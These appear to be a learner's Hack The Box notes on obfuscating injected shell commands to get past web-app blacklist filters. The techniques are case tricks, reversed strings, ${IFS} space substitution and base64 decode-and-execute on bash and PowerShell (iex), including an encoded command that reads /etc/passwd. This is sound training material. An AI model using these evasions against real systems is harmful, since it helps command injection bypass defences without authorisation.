## 🧾 HTB Notes – Advanced Command Obfuscation 
# 1. Case Manipulation

## 🔹 Idea

Change uppercase/lowercase letters so blacklist filters don’t match.

---

## 🔹 Windows (case-insensitive)

```powershell
WhOaMi
```

- Works directly because Windows ignores case
    

---

## 🔹 Linux (case-sensitive workaround)

```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

### Breakdown:

- `WhOaMi` → input string
    
- `tr "[A-Z]" "[a-z]"` → converts uppercase → lowercase
    
- Result: `whoami`
    
- `$()` → executes final result
    

---

## ❗ Problem in HTB filter

- Still blocked because:
    
    - contains **spaces**
        
    - spaces are filtered in web app
        

---

## 🔹 Fixed version idea

- Replace spaces using:
    
    - tabs `%09`
        
    - `${IFS}`
        

---

## 🔹 Alternative obfuscation

```bash
$(a="WhOaMi";printf %s "${a,,}")
```

### Breakdown:

- `a="WhOaMi"` → store string
    
- `${a,,}` → convert to lowercase
    
- `printf %s` → print string
    
- `$()` → executes result

# 2. Reversed Commands

## 🔹 Idea

- Reverse command string to avoid blacklist detection
    

---

## 🔹 Step 1: Reverse manually

```bash
echo 'whoami' | rev
```

Output:

```
imaohw
```

---

## 🔹 Step 2: Execute reversed string

```bash
$(rev<<<'imaohw')
```

### Breakdown:

- `imaohw` = reversed `whoami`
    
- `rev` → reverses it back
    
- `<<<` → input redirection
    
- `$()` → executes final output
    

---

## 🔹 Windows version

```powershell
"whoami"[-1..-20] -join ''
```

- Reverses string
    

Execution:

```powershell
iex "$('imaohw'[-1..-20] -join '')"
```

- `iex` = Invoke-Expression
    
- Executes reconstructed command

# 3. Encoded Commands (Base64)

## 🔹 Step 1: Encode command

```bash
echo -n 'cat /etc/passwd | grep 33' | base64
```

Output:

```
Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
```

---

## 🔹 Step 2: Decode + execute

```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

---

## 🔹 Breakdown

- `base64 -d` → decode payload
    
- `<<<` → pass string as input
    
- `bash<<<` → execute decoded command
    
- avoids:
    
    - spaces issues
        
    - blacklist keywords
        

---

## 🔹 Windows encoding

```powershell
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('whoami'))
```

Decode & execute:

```powershell
iex "$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

# 5. Important Concept for Exam Question

When you see:

```bash
find /usr/share/ | grep root | grep mysql | tail -n 1
```

It means:

- Search files in `/usr/share/`
    
- Filter lines containing `root`
    
- Then filter `mysql`
    
- Then show only last result (`tail -n 1`)
